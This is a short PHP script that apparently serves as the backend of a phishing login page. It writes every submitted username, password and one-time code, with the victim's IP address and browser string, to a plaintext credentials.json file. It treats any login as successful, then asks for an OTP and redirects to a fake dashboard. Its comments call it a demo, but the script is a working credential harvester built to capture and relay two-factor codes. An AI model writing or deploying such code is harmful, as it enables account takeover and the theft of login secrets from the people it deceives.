<?php
// Handle form submission and JSON storage
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $otp = $_POST['otp'] ?? '';
    
    // Prepare data to save
    $data = [
        'type' => $otp ? 'otp' : 'credentials',
        'username' => $username,
        'password' => $password,
        'otp' => $otp,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'ip_address' => $_SERVER['REMOTE_ADDR']
    ];
    
    // Save to JSON file
    $filename = 'credentials.json';
    $existingData = [];
    
    if (file_exists($filename)) {
        $existingData = json_decode(file_get_contents($filename), true) ?? [];
    }
    
    $existingData[] = $data;
    file_put_contents($filename, json_encode($existingData, JSON_PRETTY_PRINT));
    
    // For demo purposes, we'll consider any login as successful
    // In a real application, you would validate credentials here
    if ($otp) {
        // Redirect to dashboard after OTP verification
        header('Location: dashboard.html');
        exit;
    } else {
        // Return JSON response for AJAX handling
        header('Content-Type: application/json');
        echo json_encode(['status' => 'otp_required']);
        exit;
    }
}

// If not a POST request, serve the login page
?>